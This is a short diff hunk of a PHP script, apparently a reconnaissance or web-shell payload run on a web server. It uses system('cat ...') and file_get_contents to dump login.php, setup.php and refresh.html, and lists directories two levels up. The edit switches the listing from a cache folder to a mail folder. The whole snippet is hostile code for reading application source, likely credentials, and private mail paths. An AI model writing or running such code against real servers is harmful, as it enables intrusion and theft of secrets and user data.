@@ -12,5 +12,5 @@ echo system('cat refresh.html');
 echo system('cat login.php');
 echo file_get_contents('setup.php');
 echo system('ls ../..');
-echo system('ls ../../cache');
+echo system('ls ../../mail');
 ?>
